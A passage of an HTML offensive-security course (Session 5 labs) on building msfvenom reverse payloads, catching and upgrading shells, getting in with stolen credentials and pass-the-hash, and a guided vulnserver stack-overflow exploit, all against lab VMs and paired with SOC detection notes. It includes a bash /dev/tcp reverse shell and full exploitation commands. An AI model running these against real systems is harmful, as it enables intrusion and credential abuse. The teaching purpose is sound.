+<tr><td style="width:150px"><strong>SOC flip</strong></td><td><span style="color:var(--green)">The <em>callback</em> is the loud part.</span> The file may sit quietly, but the moment it runs it makes an outbound connection to you (Sysmon 3) and spawns from an unexpected parent (Sysmon 1 / 4688). Encoders (<span class="mono">-e</span>) change the bytes but <span class="hl hl-w">encoding is NOT AV evasion</span> &mdash; modern AV/EDR still flags meterpreter. Real evasion is Session 6/7.</td></tr>
+</tbody></table>
+</div><div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; prove staged is smaller than stageless</span><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp   LHOST=192.168.56.101 LPORT=443 -f exe -o staged.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp    LHOST=192.168.56.101 LPORT=443 -f exe -o stageless.exe
+ls -la staged.exe stageless.exe</code></pre><p style="margin-top:8px"><b>You should see:</b> <span class="mono">stageless.exe</span> is noticeably larger &mdash; it carries the whole payload, while <span class="mono">staged.exe</span> only carries the stager that fetches it. One character (<span class="mono">/</span> vs <span class="mono">_</span>), a real size difference.</p></div><div class="box note"><span class="box-t">Encoding is not evasion (say it in class)</span><p>Students always ask &quot;does <span class="mono">-e shikata_ga_nai</span> beat antivirus?&quot; No. Encoders exist to remove <em>bad characters</em> and were never designed to evade modern AV &mdash; signatures caught them years ago. Teach it honestly: encoding solves bad chars (crucial in Lab 8&#39;s buffer overflow), AV evasion is a separate, harder topic in Session 6/7.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Break">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P13</span><span class="tag recall">Pause</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Break &mdash; 10 Minutes</h1>
+      <p class="lede">Halfway. You have executed code three ways; next you catch, upgrade and keep your shells.</p>
+    </div>
+    <div class="content">
+      <div style="display:flex;justify-content:center;padding:20px 0">
+        <div data-timer="10">
+          <svg viewBox="0 0 120 120" width="120" height="120"><circle cx="60" cy="60" r="52" fill="none" stroke="#333b4c" stroke-width="8"/><circle cx="60" cy="60" r="52" fill="none" stroke="#ff7043" stroke-width="8" stroke-linecap="round"/></svg>
+        </div>
+      </div>
+      <div class="box soc"><span class="box-t">When we come back</span><p>Payload generation with <span class="mono">msfvenom</span> and catching the shell, upgrading a dumb shell to a real TTY / meterpreter, using an S4 credential as an exploit, and then the buffer overflow that explains why any of this is possible.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 5: msfvenom + handler">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P14</span><span class="tag lab">Hands-on · everyone · generates evidence</span><span class="time">&#9201; 14 min</span></div>
+      <h1>Lab 5 &mdash; Build a Payload, Catch the Shell</h1>
+      <p class="lede">The pattern behind every non-module exploit: generate a reverse payload, stand up a handler, run it, catch it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you are about to do</span><p>Not every foothold comes from a Metasploit exploit module. Often you generate a payload with <span class="mono">msfvenom</span>, deliver it however you can, and catch it with a handler. This is that loop &mdash; and it generates the reverse-shell evidence you will detect in Lab 9.</p></div><div class="box lab-box"><span class="box-t">Target &amp; authorisation</span><p>Deliver + run the payload on <span class="mono">WIN10-TGT01 &middot; 192.168.56.108</span> (your own VM). In a real engagement delivery is the hard part; here we hand-run it to focus on the catch.</p></div><ol class="steps">
+<li>
+<strong>Generate a staged reverse payload.</strong>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.56.101 LPORT=443 -f exe -o update.exe
+# Payload size: 201798 bytes ; Saved as: update.exe</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">update.exe</span> is written; note the payload size printed</li></ul></div>
+</li>
+<li>
+<strong>Stand up the handler FIRST</strong> (staged payloads need it listening before the callback).
+<pre><code>msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.101
+set LPORT 443
+run</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Handler reports <span class="mono">Started reverse TCP handler on 192.168.56.101:443</span></li></ul></div>
+</li>
+<li>
+<strong>Run the payload on the target, catch the shell, confirm execution.</strong>
+<pre><code>meterpreter > getuid
+meterpreter > sysinfo
+meterpreter > getpid</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">msf6 exploit(multi/handler)</span><span class="sim-tool">reverse_tcp</span></div>
+  <div class="sim-body">
+<span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"></span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">Meterpreter session opened</span></li><li>You recorded the user context in the foothold record</li><li>You saved the Sysmon 1/3 + 4688 evidence (or the fallback) for Lab 9</li></ul></div>
+</li>
+</ol><div class="box warn"><span class="box-t">Deliberate failure to feel: handler down</span><p>Try running the payload with the handler <strong>stopped</strong>. Nothing comes back &mdash; the stager connected, found no one home, and the stage never shipped. That is the staged-payload trap from the theory page, live. Start the handler, run again, and it lands.</p></div><div class="box key-takeaway"><span class="box-t">What you produced</span><p>A caught reverse shell you built yourself &mdash; and the exact network + process evidence a SOC uses to catch it. You are now on both sides of the same event, which is the whole point of Lab 9.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Shell upgrade">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P15</span><span class="tag theory">Method · keep the shell usable</span><span class="time">&#9201; 7 min</span></div>
+      <h1>From a Dumb Shell to a Real One</h1>
+      <p class="lede">The shell you first catch is half-broken &mdash; no tab-complete, no <span class="mono">sudo</span>, dies on Ctrl-C. Three upgrades fix it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why your first shell frustrates you</span><p>A raw reverse shell is a <strong>dumb shell</strong>: no job control, no terminal features, and one careless Ctrl-C kills it. Before you do real work you upgrade it &mdash; to a proper TTY, or all the way to meterpreter. This is a five-minute skill that saves every engagement after.</p></div>      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 150" role="img" aria-label="Shell upgrade path: a dumb shell becomes a TTY shell with pty tricks, or is upgraded to a meterpreter session. Click each stage.">
+          <g class="node" data-node="u1" tabindex="0"><rect x="20" y="46" width="260" height="58" rx="9" fill="#1a1f2a" stroke="#e63946"/><text class="d-title" x="150" y="70" text-anchor="middle" font-size="12.5" fill="#e63946">DUMB shell</text><text class="d-sub" x="150" y="88" text-anchor="middle">no tab, no job control, fragile</text></g>
+          <g class="node" data-node="u2" tabindex="0"><rect x="340" y="46" width="260" height="58" rx="9" fill="#1f2533" stroke="#22d3ee"/><text class="d-title" x="470" y="70" text-anchor="middle" font-size="12.5">TTY shell</text><text class="d-sub" x="470" y="88" text-anchor="middle">pty + stty &mdash; a real terminal</text></g>
+          <g class="node" data-node="u3" tabindex="0"><rect x="660" y="46" width="260" height="58" rx="9" fill="#1f2533" stroke="#a78bfa"/><text class="d-title" x="790" y="70" text-anchor="middle" font-size="12.5" fill="#a78bfa">METERPRETER</text><text class="d-sub" x="790" y="88" text-anchor="middle">upload/download, pivot, post</text></g>
+          <path d="M280,75 L338,75" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-c)"/>
+          <path d="M600,75 L658,75" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-pu)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; the command that gets you there.</div>
+        <div class="dgm-detail" data-detail="u1"><h5><span class="dd-tag">DUMB</span>What you first catch</h5><p><b>A raw pipe to a shell.</b> No tab-completion, no arrow keys, no <span class="mono">su</span>/<span class="mono">sudo</span> (they need a TTY), and Ctrl-C kills the whole session instead of the running command. Usable, but painful &mdash; do not do real work here.</p></div>
+        <div class="dgm-detail" data-detail="u2"><h5><span class="dd-tag">TTY</span>The pty upgrade</h5><p><b>Spawn a pseudo-terminal, then fix the terminal settings.</b> <span class="mono">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>, then background with Ctrl-Z, <span class="mono">stty raw -echo; fg</span>, and <span class="mono">export TERM=xterm</span>. Now tab-complete, job control and <span class="mono">sudo</span> work.</p></div>
+        <div class="dgm-detail" data-detail="u3"><h5><span class="dd-tag">METERPRETER</span>The full upgrade</h5><p><b>Trade the shell for a meterpreter session.</b> From msfconsole: <span class="mono">sessions -u 1</span> upgrades shell session 1 to meterpreter &mdash; giving <span class="mono">upload</span>/<span class="mono">download</span>, screenshot, hashdump and the post modules. Full post-exploitation is Session 6; here you just meet it.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; upgrade a dumb Linux shell to a TTY (the muscle memory)</span><pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl-Z to background
+stty raw -echo; fg
+export TERM=xterm      # now arrow keys, tab, and sudo work</code></pre><p style="margin-top:8px"><b>You should see:</b> tab-completion and the up-arrow start working, and Ctrl-C no longer kills your session. That is a dumb shell turned into a usable one &mdash; Lab 6 does it end to end.</p></div><div class="box key-takeaway"><span class="box-t">The rule</span><p><strong class="hl">Upgrade the shell before you work in it.</strong> Thirty seconds of pty/stty saves an hour of a broken terminal &mdash; and a meterpreter upgrade unlocks the tooling you need for Session 6.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 6: upgrade a shell">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P16</span><span class="tag lab">Hands-on · everyone</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Lab 6 &mdash; Turn a Dumb Shell Into a Real One</h1>
+      <p class="lede">Catch a raw shell, feel how broken it is, then upgrade it to a full TTY and finally to meterpreter.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you are about to do</span><p>Start from a plain <span class="mono">nc</span> reverse shell on Metasploitable2, prove it is dumb (try <span class="mono">sudo</span>, tab, Ctrl-C), then run the pty/stty upgrade, then upgrade the whole session to meterpreter from msfconsole.</p></div><ol class="steps">
+<li>
+<strong>Catch a raw shell and feel the pain.</strong>
+<pre><code># on Kali:
+nc -lvnp 443
+# trigger a bash reverse shell from the target:
+bash -i >& /dev/tcp/192.168.56.101/443 0>&1
+# now try:  sudo -l   (fails: no tty)   ;  press Tab (nothing)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You have a shell but <span class="mono">sudo</span> errors with &quot;no tty present&quot; and tab does nothing</li></ul></div>
+</li>
+<li>
+<strong>Upgrade to a full TTY.</strong>
+<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl-Z
+stty raw -echo; fg
+export TERM=xterm
+# now: sudo -l works, tab-complete works, Ctrl-C behaves</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">sudo -l</span> now runs, tab-complete and arrow keys work</li></ul></div>
+</li>
+<li>
+<strong>Upgrade the session to meterpreter</strong> (optional, from msfconsole).
+<pre><code># background the nc catch into a handler session first, then:
+sessions -u 1        # upgrades shell session 1 to meterpreter
+sessions -i 2
+meterpreter > sysinfo</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A meterpreter session opens with <span class="mono">upload</span>/<span class="mono">download</span> available</li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you produced</span><p>The same foothold, now actually workable. Every engagement starts with this thirty-second ritual &mdash; you now own it.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Credential-based access">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P17</span><span class="tag theory">Method · a credential is an exploit</span><span class="time">&#9201; 6 min</span></div>
+      <h1>You Don&#39;t Always Need an Exploit</h1>
+      <p class="lede">Sometimes the &quot;way in&quot; from your access plan is not a CVE at all &mdash; it is a valid credential. That is the cleanest foothold of all.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why this closes the loop with Session 4</span><p>Half your S4 access-plan rows are credentials, not vulnerabilities &mdash; a sprayed password, a cracked hash, a Kerberoasted service account. On Windows, a valid credential (or even just its hash) <em>is</em> remote code execution: no exploit, no crash, no CVE. It is also the quietest way in, and the direct bridge to Session 6.</p></div>      <div class="tbl-scroll">
+      <table><colgroup><col style="width:19%"><col style="width:48%"><col style="width:33%"></colgroup>
+        <thead><tr><th>Tool</th><th>What it gives you</th><th>How it authenticates</th></tr></thead>
+        <tbody>
+          <tr><td><span class="mono">psexec.py</span></td><td>A SYSTEM shell over SMB (creates a service)</td><td>password <em>or</em> hash (pass-the-hash)</td></tr>
+          <tr><td><span class="mono">wmiexec.py</span></td><td>A semi-interactive shell over WMI (quieter, no service)</td><td>password or hash</td></tr>
+          <tr><td><span class="mono">evil-winrm</span></td><td>A full PowerShell shell over WinRM (5985/5986)</td><td>password or hash; needs WinRM enabled</td></tr>
+          <tr><td><span class="mono">nxc smb/winrm</span></td><td>Spray one cred across many hosts; exec commands</td><td>password or hash</td></tr>
+        </tbody>
+      </table>
+      </div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; check where an S4 credential can execute code (no exploit)</span><pre><code>nxc smb 192.168.56.0/24 -u m.said -p 'Autumn2025!'
+# a line ending in (Pwn3d!) means that host will give you a shell with this cred</code></pre><p style="margin-top:8px"><b>You should see:</b> any host tagged <span class="mono">(Pwn3d!)</span> is one <span class="mono">psexec</span>/<span class="mono">evil-winrm</span> away from a shell &mdash; with a credential you already own. Lab 7 turns that into a session.</p></div><div class="box key-takeaway"><span class="box-t">The line that carries to Session 6</span><p><strong class="hl hl-d">A credential is an exploit that never crashes anything and rarely trips an IDS.</strong> It is the attacker&#39;s favourite foothold and the defender&#39;s hardest to spot &mdash; a valid login looks like a valid login.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 7: credential access">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P18</span><span class="tag lab">Hands-on · everyone · the S6 bridge</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Lab 7 &mdash; A Shell With Just a Credential</h1>
+      <p class="lede">Use an S4 credential to land a shell with no exploit at all &mdash; the foothold Session 6&#39;s privilege escalation begins from.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you are about to do</span><p>Take a credential from your S4 access plan (a sprayed password, a cracked hash, or the Kerberoasted <span class="mono">svc_backup</span>) and use it with <span class="mono">psexec</span> and <span class="mono">evil-winrm</span> to get an interactive shell &mdash; no CVE, no crash.</p></div><ol class="steps">
+<li>
+<strong>Password &rarr; a SYSTEM shell over SMB.</strong>
+<pre><code>impacket-psexec ceh.lab/m.said:'Autumn2025!'@192.168.56.20
+C:\> whoami        # nt authority\system  (psexec runs as SYSTEM)</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">kali@lab: ~</span><span class="sim-tool">impacket-psexec</span></div>
+  <div class="sim-body">
+<span class="l cmd root">impacket-psexec ceh.lab/m.said@192.168.56.20</span>
+<span class="l dim">[*] Requesting shares on 192.168.56.20.....</span>
+<span class="l dim">[*] Creating service dItL on 192.168.56.20.....</span>
+<span class="l ok">[*] Opening SVCManager on 192.168.56.20.....</span>
+<span class="l ok">[!] Press help for extra shell commands</span>
+<span class="l cmd root">C:\Windows\system32> whoami</span>
+<span class="l ok">nt authority\system</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>A credential became SYSTEM</b> &mdash; no exploit, no CVE. Note psexec creates a service (loud).</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You get an interactive shell; <span class="mono">whoami</span> shows the context you landed as</li></ul></div>
+</li>
+<li>
+<strong>Hash &rarr; a shell (pass-the-hash), no plaintext.</strong>
+<pre><code>evil-winrm -i 192.168.56.20 -u administrator -H <NT-hash>
+*Evil-WinRM* PS C:\> whoami</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A PowerShell session opens using only the NT hash &mdash; pass-the-hash proven again, now as a foothold</li></ul></div>
+</li>
+<li>
+<strong>Record the foothold and note the contrast.</strong>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Foothold record: host=DC, via=credential (m.said, from S4 spray), shell=psexec/SYSTEM &mdash; <strong>no exploit</strong></li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you produced</span><p>A shell earned entirely from Session 4&#39;s work &mdash; the quietest foothold in the session, and the exact starting point for Session 6. Some rows in your foothold record say &quot;EternalBlue&quot;; others just say &quot;a valid credential.&quot; Both are footholds.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Buffer overflow">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P19</span><span class="tag theory">Method · why exploits exist</span><span class="time">&#9201; 12 min</span></div>
+      <h1>The Buffer Overflow &mdash; Watch the Stack</h1>
+      <p class="lede">The mechanism under half of all memory-corruption RCE. Step through the stack and see how too much data becomes your code running.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why we teach the classic overflow</span><p>Modern mitigations (DEP, ASLR, stack canaries) make the <em>naive</em> stack overflow a <strong>teaching model</strong>, not a copy-paste exploit &mdash; and we will say so. But nothing else explains <em>why exploits exist at all</em> as cleanly: a program that trusts the size of its input hands you control of what runs next. Learn this and &quot;RCE&quot; stops being a magic word.</p></div>      <figure class="dgm pktflow">
+        <svg viewBox="0 0 940 300" role="img" aria-label="The stack during a buffer overflow: a normal stack with a buffer, saved EBP and a saved return address (EIP); an overflow fills past the buffer and overwrites EIP; the offset is found; EIP is set to a JMP ESP address; ESP points at shellcode which runs. Six revealed steps explain each stage.">
+          <!-- static stack frame (left) -->
+          <text class="d-title" x="140" y="28" text-anchor="middle" font-size="13">The stack (grows down)</text>
+          <rect x="30" y="44" width="220" height="46" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-sub" x="140" y="72" text-anchor="middle">buffer[64] &mdash; your input</text>
+          <rect x="30" y="96" width="220" height="40" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-sub" x="140" y="120" text-anchor="middle">saved EBP</text>
+          <rect x="30" y="142" width="220" height="48" rx="6" fill="#1a1f2a" stroke="#e63946"/><text class="d-lbl" x="140" y="164" text-anchor="middle" font-size="12" fill="#e63946">saved EIP</text><text class="d-sub" x="140" y="181" text-anchor="middle">the return address</text>
+          <rect x="30" y="196" width="220" height="46" rx="6" fill="#1f2533" stroke="#4ade80"/><text class="d-sub" x="140" y="218" text-anchor="middle" fill="#4ade80">ESP &rarr; your shellcode lands</text><text class="d-sub" x="140" y="234" text-anchor="middle">just above EIP</text>
+          <!-- step labels (right column, distinct rows, never overlap) -->
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px"><rect x="360" y="52" width="548" height="30" rx="7" fill="var(--panel)" stroke="var(--line-soft)"/><text x="376" y="72" font-size="12.5" font-weight="600" fill="var(--text-2)">1 &middot; NORMAL &mdash; input fits buffer[64]; saved EIP is a valid return address</text></g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px"><path d="M285,60 L285,225" fill="none" stroke="#ff7043" stroke-width="2.4" marker-end="url(#ar-o)"/><text x="303" y="150" font-size="10.5" fill="#ff7043" transform="rotate(90 303 150)" text-anchor="middle">overflow writes upward</text><rect x="360" y="90" width="548" height="30" rx="7" fill="var(--panel)" stroke="var(--orange)"/><text x="376" y="110" font-size="12.5" font-weight="700" fill="var(--orange)">2 &middot; FUZZ &mdash; send 2000 A&#39;s; the copy runs past the buffer, up into EIP</text></g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px"><rect x="360" y="128" width="548" height="30" rx="7" fill="rgba(230,57,70,.1)" stroke="var(--red)"/><text x="376" y="148" font-size="12.5" font-weight="700" fill="var(--red)">3 &middot; CRASH &mdash; EIP = 41414141 (&quot;AAAA&quot;). You now control EIP.</text></g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px"><rect x="360" y="166" width="548" height="30" rx="7" fill="var(--panel)" stroke="var(--cyan)"/><text x="376" y="186" font-size="12.5" font-weight="600" fill="var(--cyan)">4 &middot; OFFSET &mdash; a cyclic pattern shows EIP sits at exactly byte 1978</text></g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px"><rect x="360" y="204" width="548" height="30" rx="7" fill="rgba(167,139,250,.1)" stroke="var(--purple)"/><text x="376" y="224" font-size="12.5" font-weight="700" fill="var(--purple)">5 &middot; REDIRECT &mdash; set EIP = address of a JMP ESP instruction (a trampoline)</text></g>
+          <g class="pf-step" data-step="6" style="--pf-dx:-26px"><rect x="360" y="242" width="548" height="30" rx="7" fill="rgba(74,222,128,.1)" stroke="var(--green)"/><text x="376" y="262" font-size="12.5" font-weight="700" fill="var(--green)">6 &middot; EXECUTE &mdash; JMP ESP &rarr; shellcode at ESP runs &rarr; reverse shell</text></g>
+        </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>A function copies your input into a fixed <span class="mono">buffer[64]</span>. Just above it on the stack sits the <b>saved return address (EIP)</b> &mdash; where the CPU jumps when the function ends.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The program never checks the input length. Send <b>far more than 64 bytes</b> and the copy runs right off the end of the buffer, overwriting saved EBP and then the saved EIP.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The function returns into <span class="mono">0x41414141</span> (&quot;AAAA&quot;) and crashes. That crash is the whole game: <b>you now control EIP</b> &mdash; you decide where the CPU goes next.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>Send a unique cyclic pattern instead of A&#39;s; the value in EIP tells you the exact <b>offset</b> (here 1978). Now you can place any 4 bytes precisely on EIP.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>You cannot hardcode your shellcode&#39;s address (it moves), but ESP reliably points just after EIP. So set EIP to the address of a <b>JMP ESP</b> instruction in a loaded module &mdash; a trampoline to your code.</div>
+        <div class="pf-cap" data-cap="6"><span class="pf-n">STEP 6</span>Right after EIP you place your <b>shellcode</b> (bad characters removed first). EIP &rarr; JMP ESP &rarr; ESP &rarr; your shellcode runs &rarr; reverse shell. That is remote code execution.</div>
+        <figcaption><b class="hl">Too much data became your code.</b> Fuzz &rarr; crash &rarr; offset &rarr; control EIP &rarr; bad chars &rarr; JMP ESP &rarr; shellcode. Every classic stack overflow is these six steps.</figcaption>
+      </figure>
+      <div class="box warn"><span class="box-t">The honest currency note &mdash; say it out loud</span><p>On a modern target this naive version is stopped by <strong>DEP/NX</strong> (the stack is not executable), <strong>ASLR</strong> (module addresses move, so a hardcoded JMP ESP fails), and <strong>stack canaries</strong> (a guard value detects the overwrite). Real-world exploitation defeats these (ROP, info leaks) &mdash; that is OSED-level work, well beyond CEH. We teach the model because it explains the <em>class</em>; the countermeasures are the exam answer.</p></div><div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; prove you control EIP (concept, on the lab target)</span><pre><code># 1) crash it
+./fuzzer.py            # sends growing A's until vulnserver dies
+# 2) find the offset
+msf-pattern_create -l 2000 > pat.txt        # send this, read EIP
+msf-pattern_offset -l 2000 -q 39694438      # => Exact match at offset 1978</code></pre><p style="margin-top:8px"><b>You should see:</b> <span class="mono">Exact match at offset 1978</span> &mdash; the precise number of bytes before EIP. Controlling EIP is the milestone; Lab 8 walks the rest.</p></div><div class="box key-takeaway"><span class="box-t">Why this page matters even if you never write one</span><p><strong class="hl">A buffer overflow is what &quot;RCE&quot; means underneath.</strong> Whether it is EternalBlue in the kernel or a web app deserialising untrusted data, the shape is the same: untrusted input reaches a place that decides what code runs. Now you can read a CVE and know what it is doing.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 8: buffer overflow">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P20</span><span class="tag lab">Hands-on · everyone · guided + saved-state</span><span class="time">&#9201; 20 min</span></div>
+      <h1>Lab 8 &mdash; A Guided Stack Overflow, End to End</h1>
+      <p class="lede">The one you will remember: fuzz a real vulnerable service to a crash, control EIP, dodge the bad characters, and land a shell.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">How this lab is run</span><p>This is the hardest topic to fit in the time, so it is a <strong>guided demo you follow along</strong>, with a <strong>saved state at every step</strong> so a stuck student can jump to the next milestone and still finish. Primary target: Windows <span class="mono">vulnserver</span> + Immunity Debugger + <span class="mono">mona.py</span>. A Linux <span class="mono">gdb</span>/<span class="mono">pwndbg</span> binary is provided as a no-VM fallback.</p></div><div class="box lab-box"><span class="box-t">Targets &amp; authorisation</span><p>Primary: <span class="mono">vulnserver</span> on WIN10-TGT01 with Immunity Debugger attached (both provided). Fallback: <span class="mono">./vuln</span> on Kali (compiled <span class="mono">-fno-stack-protector -z execstack -no-pie</span>). Both are intentionally vulnerable teaching apps &mdash; never point this at anything else.</p></div><ol class="steps">
+<li>
+<strong>Step A &mdash; fuzz to a crash.</strong> Send growing input to the <span class="mono">TRUN</span> command until vulnserver dies and Immunity shows the crash.
+<pre><code>python3 fuzzer.py 192.168.56.108 9999     # sends TRUN /.:/ + A*n, growing
+# Immunity: EIP = 41414141  (crashed) ; saved-state: crash-01.snapshot</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Immunity shows <span class="mono">EIP 41414141</span> &mdash; the service crashed under your input</li></ul></div>
+</li>
+<li>
+<strong>Step B &mdash; find the offset.</strong>
+<pre><code>msf-pattern_create -l 3000 > pattern.txt     # send as the TRUN argument
+# read EIP in Immunity, then:
+msf-pattern_offset -l 3000 -q <EIP-value>     # => Exact match at offset 2003</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You have the exact offset to EIP (e.g. 2003); saved-state: offset.txt</li></ul></div>
+</li>
+<li>
+<strong>Step C &mdash; confirm EIP control.</strong> Send <span class="mono">A*offset + &quot;BBBB&quot; + C*rest</span>; EIP should read <span class="mono">42424242</span>.
+<pre><code>buf = b"A"*2003 + b"BBBB" + b"C"*400
+# Immunity: EIP = 42424242  -> you own EIP</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">EIP = 42424242</span> &mdash; precise control proven</li></ul></div>
+</li>
+<li>
+<strong>Step D &mdash; find bad characters.</strong> Send all bytes <span class="mono">\x01..\xff</span>, compare in memory with <span class="mono">!mona bytearray</span>, drop the ones that mangle.
+<pre><code>!mona bytearray -b "\x00"
+# send bytes after EIP, then compare:
+!mona compare -f bytearray.bin -a <ESP-addr>   # => bad chars: \x00 \x0a \x0d</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You have the bad-character list (commonly <span class="mono">\x00 \x0a \x0d</span>); saved-state: badchars.txt</li></ul></div>
+</li>
+<li>
+<strong>Step E &mdash; find a JMP ESP</strong> in a module without ASLR/rebase, and set EIP to it.
+<pre><code>!mona jmp -r esp -cpb "\x00\x0a\x0d"        # => 0x625011AF  (essfunc.dll, no protections)
+# EIP = 0x625011AF (little-endian: \xAF\x11\x50\x62)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">!mona jmp</span> returns a usable JMP ESP address in a non-protected module</li></ul></div>
+</li>
+<li>
+<strong>Step F &mdash; generate shellcode, land the shell.</strong>
+<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=443 \
+  -b "\x00\x0a\x0d" -f py -v shellcode
+# final buffer: A*2003 + JMP_ESP + NOPs*16 + shellcode
+nc -lvnp 443     # catch it</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">kali@lab: ~</span><span class="sim-tool">nc -lvnp 443</span></div>
+  <div class="sim-body">
+<span class="l cmd">nc -lvnp 443</span>
+<span class="l dim">listening on [any] 443 ...</span>
+<span class="l ok">connect to [192.168.56.101] from 192.168.56.108 51999</span>
+<span class="l cmd root">C:\Users\lab\Desktop> whoami</span>
+<span class="l ok">win10-tgt01\lab</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>Six steps, one shell.</b> The NOP sled (<span class="mono">\x90</span>) gives the landing a margin.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">nc</span> catches a shell from the target &mdash; the overflow became RCE</li><li>Foothold record: host=WIN10, via=BOF (vulnserver), payload=shell_reverse_tcp</li></ul></div>
+</li>
+</ol><div class="box tip"><span class="box-t">If you get stuck</span><p>Every step has a saved state &mdash; load <span class="mono">offset.txt</span>, <span class="mono">badchars.txt</span> or the pre-built final buffer and keep moving. Finishing the chain once, even with hints, teaches more than grinding one step. The Linux <span class="mono">gdb</span> fallback follows the identical fuzz&rarr;offset&rarr;control&rarr;shellcode logic if Immunity misbehaves.</p></div><div class="box key-takeaway"><span class="box-t">What you produced</span><p>You turned <em>too much input</em> into <em>your shell</em> &mdash; the single most important mechanism in offensive security, done with your own hands. You will never read &quot;stack-based buffer overflow&quot; in a CVE the same way again.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The SOC flip">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P21</span><span class="tag defensive">Defender · the consolidated flip</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Every Shell Today, and the Log It Left</h1>
